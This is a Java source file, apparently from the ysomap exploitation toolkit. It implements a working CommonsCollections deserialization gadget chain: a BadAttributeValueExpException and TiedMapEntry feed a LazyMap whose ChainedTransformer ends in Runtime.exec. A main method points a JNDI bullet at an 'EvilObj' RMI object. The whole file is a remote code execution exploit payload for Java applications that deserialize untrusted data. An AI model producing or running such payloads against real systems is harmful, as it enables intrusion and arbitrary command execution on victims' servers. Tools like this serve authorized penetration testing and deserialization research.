package ysomap.gadget.payload.collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.Bullet;
import ysomap.gadget.bullet.collections.TransformerBullet;
import ysomap.gadget.bullet.collections.TransformerWithJNDIBullet;
import ysomap.gadget.payload.Payload;
import ysomap.runner.PayloadRunner;
import ysomap.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
@Require(bullets = {"TransformerBullet","TransformerWithJNDIBullet","TransformerWithTemplatesImplBullet","TransformerWithResponseBullet"})
@Dependencies({"commons-collections:commons-collections:3.2.1, without security manager"})
public class CommonsCollections4 extends Payload<BadAttributeValueExpException>{

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof org.apache.commons.collections.Transformer[];
    }

    @Override
    public BadAttributeValueExpException pack(Object obj) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", obj);
        return val;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        Bullet bullet = new TransformerBullet();
        bullet.set("args", command);
        bullet.set("version", "3");
        return bullet;
    }

    public static void main(String[] args) throws Exception {
        Bullet bullet = new TransformerWithJNDIBullet();
        bullet.set("jndiURL","rmi://localhost:1099/EvilObj");

        new PayloadRunner()
                .setBullet(bullet)
                .setPayload(new CommonsCollections4())
                .test();
    }
}
